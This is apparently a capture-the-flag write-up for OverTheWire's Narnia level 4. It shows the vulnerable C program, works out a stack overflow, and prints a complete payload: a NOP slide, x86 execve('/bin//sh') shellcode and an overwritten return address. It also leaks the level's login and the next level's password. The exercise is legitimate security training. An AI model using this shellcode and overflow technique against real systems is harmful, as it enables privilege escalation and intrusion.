login as `narnia4:iqNWNk173q`

```
narnia4@gibson:/narnia$ cat narnia4.c
```

```cpp
/*
   This program is free software; you can redistribute it and/or modify
   it under the terms of the GNU General Public License as published by
   the Free Software Foundation; either version 2 of the License, or
   (at your option) any later version.

   This program is distributed in the hope that it will be useful,
   but WITHOUT ANY WARRANTY; without even the implied warranty of
   MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
   GNU General Public License for more details.

   You should have received a copy of the GNU General Public License
   along with this program; if not, write to the Free Software
   Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA  02110-1301  USA
*/

#include <string.h>
#include <stdlib.h>
#include <stdio.h>
#include <ctype.h>

extern char **environ;

int main(int argc,char **argv){
    int i;
    char buffer[256];

    for(i = 0; environ[i] != NULL; i++)
        memset(environ[i], '\0', strlen(environ[i]));

    if(argc>1)
        strcpy(buffer,argv[1]);

    return 0;
}
```

just overwrite more variables i suppose...

still a nop slide + shellcode + more nop to pad + eip overwriting, to a total of 256 (`buffer`) + 4 (`i`) + 4 (overwritng ebp) + 4 (eip) = 268 bytes

to keep the stack layout consistent, just pass 268 `A` in first...

```sh
$ ltrace ./narnia4 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

[...]

memset(0xffffdfdc, '\0', 17)                                                                                         = 0xffffdfdc
strcpy(0xffffd1b4, "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA"...)                                                            = 0xffffd1b4
```

address of `buffer` is 0xffff**fd1b4**, so we use an address of 0xffff**d1c0**

```py
> a = b'\xbb\xb6\x37\x01\x01\x81\xeb\x01\x01\x01\x01\xb9\xb6\x37\x01\x01\x81\xe9\x01\x01\x01\x01\x31\xc0\xb0\x46\xcd\x80\x31\xc0\x50\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80'

> (b'\x90' * 20 + a + b'\x90' * 187 + b'\x90\x90\x90\x90' + b'\xc0\xd1\xff\xff')
b'\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xbb\xb67\x01\x01\x81\xeb\x01\x01\x01\x01\xb9\xb67\x01\x01\x81\xe9\x01\x01\x01\x011\xc0\xb0F\xcd\x801\xc0Phn/shh//bi\x89\xe3P\x89\xe2S\x89\xe1\xb0\x0b\xcd\x80\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xc0\xd1\xff\xff'
```

blah blah blah password is Ni3xHPEuuw

